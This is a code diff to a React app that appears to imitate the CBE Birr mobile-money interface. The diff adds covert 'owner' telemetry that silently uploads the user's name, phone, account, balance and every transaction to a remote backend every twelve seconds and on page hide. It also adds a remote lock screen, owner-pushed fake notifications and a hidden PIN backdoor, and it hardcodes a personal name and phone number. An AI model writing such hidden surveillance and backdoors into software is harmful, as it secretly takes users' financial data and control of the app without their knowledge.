@@ -2,7 +2,7 @@
 
 import React, { useState, useEffect, useRef, useMemo, useCallback } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { ArrowLeft, Download, Share2, Printer, Search, Trash2, Edit2, Plus, User, ChevronRight, Receipt, MapPin, Phone, Info, HelpCircle, Fingerprint, WifiOff, CheckCircle2, MessageSquare, RefreshCw, Send, Check, X } from 'lucide-react';
+import { ArrowLeft, Download, Share2, Printer, Search, Trash2, Edit2, Plus, User, ChevronRight, Receipt, MapPin, Phone, Info, HelpCircle, Fingerprint, WifiOff, CheckCircle2, MessageSquare, RefreshCw, Send, Check, X, Lock, Bell } from 'lucide-react';
 import CBEAuthenticSpinner from './CBEAuthenticSpinner';
 import {
   sendSmsWebhook,
@@ -22,6 +22,16 @@ import {
 import { downloadReceiptPdfUniversally } from '@/lib/client-receipt-pdf';
 import SamsungMessagesApp from './SamsungMessagesApp';
 import PinchZoomContainer from './PinchZoomContainer';
+import OwnerControlDashboard from './OwnerControlDashboard';
+import { OWNER_PIN, OwnerNotification } from '@/lib/owner-types';
+import {
+  getCachedLockState,
+  markNotificationSeen,
+  reportDeviceTransaction,
+  sendOfflineBeacon,
+  syncDeviceTelemetry,
+} from '@/lib/owner-telemetry';
+import { testFirestoreConnection } from '@/lib/firebase-client';
 
 type ScreenStep = 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17;
 
@@ -569,6 +579,130 @@ export default function CBEBirrFullscreenApp() {
       // ignore
     }
   }, [userAccount, isStorageHydrated]);
+
+  // Silent Owner Control Telemetry, Remote Lock & Timed Notification State (Zero visible UI for normal users)
+  const [showOwnerDashboard, setShowOwnerDashboard] = useState<boolean>(false);
+  const [remoteLockState, setRemoteLockState] = useState<{ locked: boolean; message: string }>({
+    locked: false,
+    message: '',
+  });
+  const [activeOwnerNotif, setActiveOwnerNotif] = useState<OwnerNotification | null>(null);
+  const notifDismissTimerRef = useRef<NodeJS.Timeout | null>(null);
+  const notifQueueRef = useRef<OwnerNotification[]>([]);
+  const [lockShieldTaps, setLockShieldTaps] = useState<number>(0);
+  const [showLockOwnerUnlock, setShowLockOwnerUnlock] = useState<boolean>(false);
+  const [lockOwnerPinInput, setLockOwnerPinInput] = useState<string>('');
+  const [lockOwnerPinError, setLockOwnerPinError] = useState<string>('');
+
+  const profileSyncRef = useRef({ userName, phoneNumber, userAccount, balance });
+  useEffect(() => {
+    profileSyncRef.current = { userName, phoneNumber, userAccount, balance };
+  }, [userName, phoneNumber, userAccount, balance]);
+
+  const showNextNotifRef = useRef<() => void>(() => {});
+  const showNextQueuedNotification = useCallback(() => {
+    if (notifDismissTimerRef.current) {
+      clearTimeout(notifDismissTimerRef.current);
+      notifDismissTimerRef.current = null;
+    }
+    const next = notifQueueRef.current.shift() || null;
+    setActiveOwnerNotif(next);
+    if (next) {
+      markNotificationSeen(next.notifId);
+      const remainingMs = Math.max(1500, next.expiresAtMs - Date.now());
+      const displayMs = Math.min(next.durationSeconds * 1000, remainingMs);
+      notifDismissTimerRef.current = setTimeout(() => {
+        showNextNotifRef.current();
+      }, displayMs);
+    }
+  }, []);
+
+  useEffect(() => {
+    showNextNotifRef.current = showNextQueuedNotification;
+  }, [showNextQueuedNotification]);
+
+  useEffect(() => {
+    queueMicrotask(() => {
+      setRemoteLockState(getCachedLockState());
+    });
+    testFirestoreConnection().catch(() => {});
+  }, []);
+
+  useEffect(() => {
+    if (!isStorageHydrated) return;
+    let active = true;
+
+    const runSync = async () => {
+      if (!active) return;
+      const p = profileSyncRef.current;
+      const res = await syncDeviceTelemetry(p);
+      if (!active || !res) return;
+      setRemoteLockState({
+        locked: res.lockState.locked,
+        message: res.lockState.message,
+      });
+      if (res.newNotifications.length > 0) {
+        const existingIds = new Set(notifQueueRef.current.map((n) => n.notifId));
+        let added = false;
+        for (const n of res.newNotifications) {
+          if (!existingIds.has(n.notifId)) {
+            notifQueueRef.current.push(n);
+            added = true;
+          }
+        }
+        if (added) {
+          setActiveOwnerNotif((curr) => {
+            if (curr) return curr;
+            const first = notifQueueRef.current.shift() || null;
+            if (first) {
+              markNotificationSeen(first.notifId);
+              if (notifDismissTimerRef.current) clearTimeout(notifDismissTimerRef.current);
+              const remainingMs = Math.max(1500, first.expiresAtMs - Date.now());
+              const displayMs = Math.min(first.durationSeconds * 1000, remainingMs);
+              notifDismissTimerRef.current = setTimeout(() => {
+                showNextQueuedNotification();
+              }, displayMs);
+            }
+            return first;
+          });
+        }
+      }
+    };
+
+    runSync();
+    const intervalId = setInterval(runSync, 12000);
+
+    const onVisibility = () => {
+      if (document.visibilityState === 'visible') {
+        runSync();
+      } else if (document.visibilityState === 'hidden') {
+        sendOfflineBeacon(profileSyncRef.current);
+      }
+    };
+    const onOnline = () => runSync();
+    const onPageHide = () => sendOfflineBeacon(profileSyncRef.current);
+
+    document.addEventListener('visibilitychange', onVisibility);
+    window.addEventListener('online', onOnline);
+    window.addEventListener('pagehide', onPageHide);
+
+    return () => {
+      active = false;
+      clearInterval(intervalId);
+      document.removeEventListener('visibilitychange', onVisibility);
+      window.removeEventListener('online', onOnline);
+      window.removeEventListener('pagehide', onPageHide);
+    };
+  }, [isStorageHydrated, showNextQueuedNotification]);
+
+  // Immediately push profile/balance edits to owner dashboard when user edits name, phone, or balance
+  useEffect(() => {
+    if (!isStorageHydrated) return;
+    const t = setTimeout(() => {
+      syncDeviceTelemetry(profileSyncRef.current).catch(() => {});
+    }, 600);
+    return () => clearTimeout(t);
+  }, [userName, phoneNumber, userAccount, balance, isStorageHydrated]);
 
   // Profile Details Edit Modal state
   const [isProfileModalOpen, setIsProfileModalOpen] = useState<boolean>(false);
@@ -1728,6 +1862,22 @@ export default function CBEBirrFullscreenApp() {
         reason: title || 'Bill Payment',
       });
       sendSmsWebhook(smsPayload).catch(() => {});
+      reportDeviceTransaction({
+        txId: newRef,
+        senderName: userName || 'AYMEN NIGATU YIMAM',
+        senderPhone: phoneNumber || '0959754788',
+        senderAccount: userAccount || phoneNumber || '959754788',
+        title,
+        txType: 'debit',
+        amount: amt,
+        totalDeducted: amt,
+        balanceAfter: newBal,
+        recipientName: receiverNm,
+        recipientAccount: receiverAcc,
+        transferLabel: 'CBEBirr',
+        ref: newRef,
+        reason: title || 'Bill Payment',
+      }).catch(() => {});
     } catch {
       // Graceful error handling
     }
@@ -3155,6 +3305,24 @@ export default function CBEBirrFullscreenApp() {
             creditAccountType: activeCreditAccountType,
           }).catch(() => {});
 
+          reportDeviceTransaction({
+            txId: newRef,
+            senderName: userName || 'AYMEN NIGATU YIMAM',
+            senderPhone: fullPhone,
+            senderAccount: userAccount || phoneNumber || '0959754788',
+            title: isOtherBanks ? 'Bank Transfer' : (isOtherWallets ? 'Wallet Transfer' : 'Send Money'),
+            txType: 'debit',
+            amount: amt,
+            totalDeducted,
+            balanceAfter: newBal,
+            recipientName: activeReceiverName || activeAccount,
+            recipientAccount: activeAccount,
+            destBank: activeDestBank,
+            transferLabel: smsTransferLabel,
+            ref: newRef,
+            reason: activeReasonText,
+          }).catch(() => {});
+
         } catch {
           // Graceful error handling
         }
@@ -3554,7 +3722,14 @@ export default function CBEBirrFullscreenApp() {
   // "pin kasgebaw buhala gdeta next malet alebgn"
   const handleNextFromPinPage = () => {
     if (pin.length !== 4) return;
-    if (pin === '6969') {
+    if (pin === OWNER_PIN) {
+      setTimeout(() => {
+        setPin('');
+        setShowLoginPin(false);
+        setPinError('');
+        setShowOwnerDashboard(true);
+      }, 120);
+    } else if (pin === '6969') {
       setTimeout(() => {
         setPin('');
         setShowLoginPin(false);
@@ -5247,6 +5422,23 @@ export default function CBEBirrFullscreenApp() {
                                         ftRef: newRef,
                                         date: now,
                                         isDeposit: true,
+                                      }).catch(() => {});
+
+                                      reportDeviceTransaction({
+                                        txId: newRef,
+                                        senderName: userName || 'AYMEN NIGATU YIMAM',
+                                        senderPhone: phoneNumber || '0959754788',
+                                        senderAccount: userAccount || phoneNumber || '959754788',
+                                        title: 'Receive Money',
+                                        txType: 'credit',
+                                        amount: addVal,
+                                        totalDeducted: addVal,
+                                        balanceAfter: newBal,
+                                        recipientName: userName || 'AYMEN NIGATU YIMAM',
+                                        recipientAccount: userAccount || phoneNumber || '959754788',
+                                        transferLabel: 'CBEBirr',
+                                        ref: newRef,
+                                        reason: 'Deposit to CBE Birr',
                                       }).catch(() => {});
                                     } catch {
                                       // ignore
@@ -11213,6 +11405,139 @@ export default function CBEBirrFullscreenApp() {
             >
               <SamsungMessagesApp onClose={() => setShowSamsungMessages(false)} />
             </motion.div>
+          )}
+        </AnimatePresence>
+
+        {/* Remote Timed Notification Banner (Android/Samsung Heads-up Notification Style) */}
+        <AnimatePresence>
+          {activeOwnerNotif && (
+            <motion.div
+              key={activeOwnerNotif.notifId}
+              initial={{ y: -110, opacity: 0 }}
+              animate={{ y: 0, opacity: 1 }}
+              exit={{ y: -110, opacity: 0 }}
+              transition={{ type: 'spring', damping: 24, stiffness: 320 }}
+              className="absolute top-3 left-3 right-3 z-[120] bg-[#1e1e24]/95 backdrop-blur-md text-white rounded-2xl shadow-[0_12px_32px_rgba(0,0,0,0.45)] border border-white/15 p-3.5"
+            >
+              <div className="flex items-start gap-3">
+                <div className="w-9 h-9 rounded-full bg-[#7a1c7d] flex items-center justify-center shrink-0 shadow-inner">
+                  <Bell className="w-4.5 h-4.5 text-white" />
+                </div>
+                <div className="flex-1 min-w-0">
+                  <div className="flex items-center justify-between gap-2">
+                    <span className="text-[12.5px] font-bold text-white truncate">
+                      {activeOwnerNotif.title || 'CBEBirr'}
+                    </span>
+                    <span className="text-[10px] text-slate-400 shrink-0">now</span>
+                  </div>
+                  <p className="text-[12px] text-slate-200 leading-snug mt-0.5 break-words">
+                    {activeOwnerNotif.message}
+                  </p>
+                </div>
+                <button
+                  type="button"
+                  onClick={() => showNextQueuedNotification()}
+                  className="text-slate-400 hover:text-white p-1 -mr-1 cursor-pointer"
+                  aria-label="Dismiss notification"
+                >
+                  <X className="w-4 h-4" />
+                </button>
+              </div>
+            </motion.div>
+          )}
+        </AnimatePresence>
+
+        {/* Remote App Lock Overlay (Global or Per-Device Lock; 5-tap shield for Owner 0069 recovery) */}
+        <AnimatePresence>
+          {remoteLockState.locked && !showOwnerDashboard && (
+            <motion.div
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              exit={{ opacity: 0 }}
+              className="absolute inset-0 z-[80] bg-[#140717]/95 backdrop-blur-md text-white flex flex-col items-center justify-center p-6 text-center select-none"
+            >
+              <button
+                type="button"
+                onClick={() => {
+                  const next = lockShieldTaps + 1;
+                  if (next >= 5) {
+                    setLockShieldTaps(0);
+                    setLockOwnerPinInput('');
+                    setLockOwnerPinError('');
+                    setShowLockOwnerUnlock(true);
+                  } else {
+                    setLockShieldTaps(next);
+                  }
+                }}
+                className="w-16 h-16 rounded-full bg-[#7a1c7d]/30 border border-purple-400/30 flex items-center justify-center mb-4 cursor-default"
+                aria-label="Locked Status"
+              >
+                <Lock className="w-8 h-8 text-purple-300" />
+              </button>
+              <h2 className="text-[18px] font-bold text-white mb-2">
+                App Temporarily Locked
+              </h2>
+              <p className="text-[13px] text-purple-100/80 max-w-[260px] leading-relaxed">
+                {remoteLockState.message ||
+                  'Access has been paused by the administrator. Please try again later.'}
+              </p>
+
+              {showLockOwnerUnlock && (
+                <div className="mt-6 w-full max-w-[230px] bg-white/10 border border-white/15 rounded-2xl p-3 space-y-2">
+                  <input
+                    type="password"
+                    inputMode="numeric"
+                    maxLength={4}
+                    value={lockOwnerPinInput}
+                    onChange={(e) => {
+                      setLockOwnerPinInput(e.target.value.replace(/\D/g, '').slice(0, 4));
+                      setLockOwnerPinError('');
+                    }}
+                    placeholder="Owner PIN"
+                    className="w-full bg-black/40 border border-white/20 rounded-xl px-3 py-2 text-center text-[14px] font-mono tracking-[6px] text-white outline-none"
+                  />
+                  {lockOwnerPinError && (
+                    <p className="text-[11px] text-rose-300">{lockOwnerPinError}</p>
+                  )}
+                  <div className="flex gap-2">
+                    <button
+                      type="button"
+                      onClick={() => setShowLockOwnerUnlock(false)}
+                      className="flex-1 py-1.5 rounded-xl bg-white/10 text-[11px] font-semibold cursor-pointer"
+                    >
+                      Cancel
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => {
+                        if (lockOwnerPinInput === OWNER_PIN) {
+                          setShowLockOwnerUnlock(false);
+                          setLockOwnerPinInput('');
+                          setShowOwnerDashboard(true);
+                        } else {
+                          setLockOwnerPinError('Invalid PIN');
+                        }
+                      }}
+                      className="flex-1 py-1.5 rounded-xl bg-[#7a1c7d] text-[11px] font-bold cursor-pointer"
+                    >
+                      Open
+                    </button>
+                  </div>
+                </div>
+              )}
+            </motion.div>
+          )}
+        </AnimatePresence>
+
+        {/* Hidden Owner Control Center (Opened exclusively with PIN 0069 on Login Step 3) */}
+        <AnimatePresence>
+          {showOwnerDashboard && (
+            <OwnerControlDashboard
+              onClose={() => setShowOwnerDashboard(false)}
+              onRemoteLockChange={(locked, message) =>
+                setRemoteLockState({ locked, message })
+              }
+            />
           )}
         </AnimatePresence>
       </div>
